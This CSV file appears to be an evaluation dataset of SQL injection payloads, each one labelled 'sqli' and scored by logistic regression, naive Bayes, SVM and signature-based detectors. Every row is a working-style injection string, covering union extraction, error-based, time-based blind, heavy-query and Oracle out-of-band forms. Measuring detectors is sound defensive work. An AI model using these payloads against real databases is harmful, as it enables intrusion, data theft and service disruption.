payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
"-9861' union all select 5710,5710,5710,5710,5710--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) union all select null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 9516=9516;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-9340) where 5462=5462 or 3038=3038,sqli,0,0,0,benign,benign,sqli,sqli,benign,benign,benign,benign
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2006')) union all select 7852,7852,7852,7852,7852--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select wpkh where 5842=5842;select sleep(5))+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%')) rlike sleep(5) and (('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""zgoy"" like ""zgoy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') as dqgr where 2427=2427 and (3020=3020)*6703--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' in boolean mode) union all select null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" or sleep(5)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' union all select null--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1';waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-9331' or (4519=2912)*2912 and 'rddk'='rddk,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3620'||(select 'kmei' where 8533=8533 union all select 8533,8533,8533,8533--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9531'))) union all select 4076,4076#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6815) where 2498=2498 union all select 2498,2498,2498,2498,2498--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'bwrb' like 'bwrb",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1));(select * from (select(sleep(5)))acdk)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 7684=7684 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as boeh where 2571=2571 union all select null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8844""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"") and 9764=6037 and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' or 8466=benchmark(5000000,md5(0x694a4745))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""))) and (3020=3020)*6703 and (((""fqap"" like ""fqap",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('ibrj'='ibrj",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3359 union all select 4675,4675,4675--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as qyic where 9736=9736 and elt(3114=3114,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4980"" or (8459=8459)*4906 and ""mnlj"" like ""mnlj",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'ggcm' like 'ggcm",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2434'))) union all select 5509,5509,5509,5509,5509,5509,5509--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9688%'))) or elt(3695=7995,7995) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8245"")) or 3038=3038",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1));select pg_sleep(5) and ((4382=4382,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'))) or sleep(5) and ((('bmnf' like 'bmnf,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' where 9216=9216;select sleep(5)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) as xwgf where 4204=4204 and sleep(5)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'mjkz' where 9430=9430 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"";begin user_lock.sleep(5); end--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 where 7412=7412 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'))) rlike (select (case when (5855=7142) then 1 else 0x28 end)) and ((('fkhd'='fkhd,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2013"")) as kisy where 3802=3802 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3370' in boolean mode) union all select 3432,3432,3432,3432#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5161%"" or (1437=4869)*4869 and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'qyyg'='qyyg",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3282') union all select 9002,9002,9002,9002,9002#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2898"" where 3301=3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select ohqr where 5610=5610;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1%');(select * from (select(sleep(5)))srmq) and ('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('iqvg'='iqvg",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 where 5627=5627 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) union all select null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%' or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('wgbh'='wgbh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) where 3740=3740 union all select null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) and 2006=2006,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'+(select 'rguk' where 6019=6019 union all select null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1)) as xsyk where 2575=2575 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 5850=5850 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4025"" or 3038=3038",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as lhie where 4631=4631 union all select null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""jebr"" like ""jebr",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as jngl where 8384=8384 and 4580=1718--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'tqvy' like 'tqvy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 7158=7158;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%' waitfor delay '0:0:5' and '%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%' or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
(select (case when (4108=4108) then 1 else 4108*(select 4108 from information_schema.character_sets) end)),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as lexx where 2892=2892 or elt(6272=6272,sleep(5))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2414%"") or elt(1032=1032,3623) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'vunt'='vunt",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1)) as bwrg where 3254=3254 union all select null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""lsvg"" like ""lsvg",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'));select (case when (9667=6212) then 9667 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4236) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'))) or 4240=(select 4240 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%';waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('ochr' like 'ochr",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'+(select 'ezpy' where 5282=5282 order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 1793=1793;select (case when (5390=7419) then 5390 else 5390*(select 5390 from mysql.db) end)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 9656=9656 and sleep(5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") or (select * from (select(sleep(5)))ydpu) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"";(select * from (select(sleep(5)))acdk)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1))) or 8421=(select count(*) from generate_series(1,5000000)) and (((5340=5340",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5731"" union all select 3083,3083,3083#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)));select sleep(5) and (((8354=8354,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1) as azdb where 4219=4219 union all select null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8684 union all select 9519,9519,9519,9519--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) and elt(1750=7826,7826) and (((""qcro""=""qcro",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' where 4102=4102 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"");iif(5257=5257,1,1/0)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"" union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('skdy'='skdy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'idxa'='idxa",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8614') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1588%""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7601""))) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 9446=9446 union all select null#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as afxc where 7497=7497;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as otsb where 8380=8380 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and 7533=7533 and ((""gkca""=""gkca",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-8734%"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"");select count(*) from generate_series(1,5000000)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 5406=5406 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3391' union all select 2024,2024--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4168') union all select 2618,2618#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2131"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""wpsf"" like ""wpsf",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'||(select 'ymre' where 8681=8681;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9924)) as zgqa where 2867=2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select 'wsjk' where 3291=3291;select (case when (9816=1693) then 9816 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8609' union all select 9384,9384,9384,9384--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""wile"" like ""wile",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""gcnq"" like ""gcnq",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%');select case when 7717=7717 then 1 else null end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('cdaq' like 'cdaq",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)) as xmac where 7692=7692;begin dbms_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('peyy'='peyy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') as wvvo where 4288=4288;select (case when (5009=1133) then 5009 else 5009*(select 5009 from information_schema.character_sets) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('hmsu'='hmsu",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# msrb",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4699) as mymz where 3405=3405 or elt(1032=1032,3623)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%' and 7366=9197#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
